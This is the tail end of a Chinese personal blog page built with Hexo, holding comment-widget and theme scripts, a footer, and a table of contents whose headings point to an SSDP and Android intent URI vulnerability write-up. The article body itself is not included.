                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    


    <div class="comments-container border-box">
        <div id="comments-anchor" class="comment-area-title border-box">
            <i class="fas fa-comments"></i>&nbsp;评论
        </div>
        <div class="comment-plugin-fail border-box">
    <span class="fail-tip">评论插件加载失败</span>
    <button class="reload keep-button">点击重新加载</button>
</div>
<div class="comment-plugin-loading flex-center border-box">
    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
    <span class="load-tip">正在加载评论插件</span>
</div>
<script data-pjax>
  window.KeepCommentPlugin = {}
  window.KeepCommentPlugin.hideLoading = () => {
    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
    cplDom.style.display = 'none'
  }
  window.KeepCommentPlugin.loadFailHandle = () => {
    window.KeepCommentPlugin.hideLoading()
    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
    cpfDom.style.display = 'flex'
    cpfDom.querySelector('.reload').addEventListener('click', () => {
      window.location.reload()
    })
  }
</script>

        
            

    <div class="giscus-comments-container">
        <div class="giscus" id="giscus"></div>
        <script 
                onerror="window.KeepCommentPlugin.loadFailHandle()"
        >
          if (!window.KeepCommentPlugin?.getGiscusTheme) {
            window.KeepCommentPlugin.getGiscusTheme = () => {
              return document.documentElement.classList.contains('dark-mode') ? 'dark_dimmed' : 'light_tritanopia'
            }
          }

          if (!window.KeepCommentPlugin?.changeGiscusTheme) {
            window.KeepCommentPlugin.changeGiscusTheme = () => {
              const iframe = document.querySelector('iframe.giscus-frame')
              iframe && iframe.contentWindow.postMessage({
                giscus: {
                  setConfig: {
                    theme: window.KeepCommentPlugin.getGiscusTheme()
                  }
                }
              }, 'https://giscus.app')
            }
          }

          if (!window.KeepCommentPlugin?.initGiscus) {
            window.KeepCommentPlugin.initGiscus = () => {
              const script = document.createElement('script')
              script.async = true
              script.src = 'https://giscus.app/client.js'
              script.setAttribute('data-repo', 'arch3rn4r/arch3rn4r.github.io')
              script.setAttribute('data-repo-id', 'R_kgDOLnMFhw')
              script.setAttribute('data-category', 'Announcements')
              script.setAttribute('data-category-id', 'DIC_kwDOLnMFh84Cik-D')
              script.setAttribute('data-reactions-enabled', '0')
              script.setAttribute('data-lang', 'zh-CN')
              script.setAttribute('data-mapping', 'pathname')
              script.setAttribute('data-strict', '0')
              script.setAttribute('data-emit-metadata', '0')
              script.setAttribute('data-input-position', 'top')
              script.setAttribute('crossorigin', 'anonymous')
              script.setAttribute('loading', 'lazy')
              script.setAttribute('data-theme', window.KeepCommentPlugin.getGiscusTheme())
              document.querySelector('.giscus-comments-container').appendChild(script)
              script.onerror = () => {
                window.KeepCommentPlugin.loadFailHandle()
              }
              script.onload = () => {
                window.KeepCommentPlugin.hideLoading()
              }
              const toggleThemeBtn = document.querySelector('.tool-toggle-theme-mode')
              toggleThemeBtn && toggleThemeBtn.addEventListener('click', () => {
                window.KeepCommentPlugin.changeGiscusTheme()
              })
            }
          }

          if ('false' === "true") {
            setTimeout(() => {
              window.KeepCommentPlugin.initGiscus()
            }, 1000)
          } else {
            window.addEventListener("DOMContentLoaded", window.KeepCommentPlugin.initGiscus)
          }
        </script>
    </div>


        
    </div>





                
            </div>
        </div>

        
            <div class="pc-post-toc left-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0"><span class="nav-text">漏洞简述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSDP"><span class="nav-text">SSDP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-text">脚本分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E5%BB%BApayload"><span class="nav-text">构建payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%A8%E5%8F%B7%E5%99%A8"><span class="nav-text">拨号器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Android-intent-URI"><span class="nav-text">Android intent URI</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="nav-text">漏洞验证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%8D%93%E9%BB%98%E8%AE%A4%E7%9A%84URL"><span class="nav-text">安卓默认的URL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%A8%E5%8F%B7%E5%99%A8-1"><span class="nav-text">拨号器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6"><span class="nav-text">文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E5%BB%BA%E5%BA%94%E7%94%A8%E5%85%B3%E8%81%94%E7%9A%84Android-Intent-URL"><span class="nav-text">构建应用关联的Android Intent URL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A6%96%E5%85%88%E6%98%AF%E5%92%8Cfirefox%E7%9B%B8%E5%85%B3%E8%81%94%E7%9A%84url"><span class="nav-text">首先是和firefox相关联的url</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%84%B6%E5%90%8E%E6%98%AF%E5%B0%9D%E8%AF%95%E8%A7%A6%E5%8F%91chrome"><span class="nav-text">然后是尝试触发chrome</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8Bhttp"><span class="nav-text">检测http</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEexample-com"><span class="nav-text">直接访问example.com</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEhttp-example-com-device-xml"><span class="nav-text">访问http:&#x2F;&#x2F;example.com&#x2F;device.xml</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%83%A8%E7%BD%B2http%E6%9C%8D%E5%8A%A1%E8%AE%BE%E5%A4%87"><span class="nav-text">部署http服务设备</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
        
            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">arch3rn4r</a>
        
    </div>

    <div class="theme-info info-item">
        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
    </div>

    

    
        <div class="count-info info-item">
            
                <span class="count-item border-box word">
                    <span class="item-type border-box">总字数</span>
                    <span class="item-value border-box word">78.1k</span>
                </span>
            

            
                <span class="count-item border-box uv">
                    <span class="item-type border-box">访客数</span>
                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
                </span>
            

            
        </div>
    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools left-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        
            <li class="tools-item go-to-comments-tablet flex-center">
                <i class="fas fa-comment"></i>
            </li>
        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0"><span class="nav-text">漏洞简述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSDP"><span class="nav-text">SSDP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-text">脚本分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E5%BB%BApayload"><span class="nav-text">构建payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%A8%E5%8F%B7%E5%99%A8"><span class="nav-text">拨号器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Android-intent-URI"><span class="nav-text">Android intent URI</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="nav-text">漏洞验证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%8D%93%E9%BB%98%E8%AE%A4%E7%9A%84URL"><span class="nav-text">安卓默认的URL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%A8%E5%8F%B7%E5%99%A8-1"><span class="nav-text">拨号器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6"><span class="nav-text">文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E5%BB%BA%E5%BA%94%E7%94%A8%E5%85%B3%E8%81%94%E7%9A%84Android-Intent-URL"><span class="nav-text">构建应用关联的Android Intent URL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A6%96%E5%85%88%E6%98%AF%E5%92%8Cfirefox%E7%9B%B8%E5%85%B3%E8%81%94%E7%9A%84url"><span class="nav-text">首先是和firefox相关联的url</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%84%B6%E5%90%8E%E6%98%AF%E5%B0%9D%E8%AF%95%E8%A7%A6%E5%8F%91chrome"><span class="nav-text">然后是尝试触发chrome</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8Bhttp"><span class="nav-text">检测http</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEexample-com"><span class="nav-text">直接访问example.com</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEhttp-example-com-device-xml"><span class="nav-text">访问http:&#x2F;&#x2F;example.com&#x2F;device.xml</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%83%A8%E7%BD%B2http%E6%9C%8D%E5%8A%A1%E8%AE%BE%E5%A4%87"><span class="nav-text">部署http服务设备</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>





<!-- common js -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/libs/anime.min.js"></script>

<!-- local search -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/local-search.min.js"></script>


<!-- lazyload -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/lazyload.min.js"></script>


<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/post-helper.min.js"></script>

        <!-- toc -->
        
            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/toc.min.js"></script>
        

        <!-- copyright-info -->
        
            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/copyright-info.min.js"></script>
        

        <!-- share -->
        
            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/share.min.js"></script>
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



    
        
    

</body>
</html>
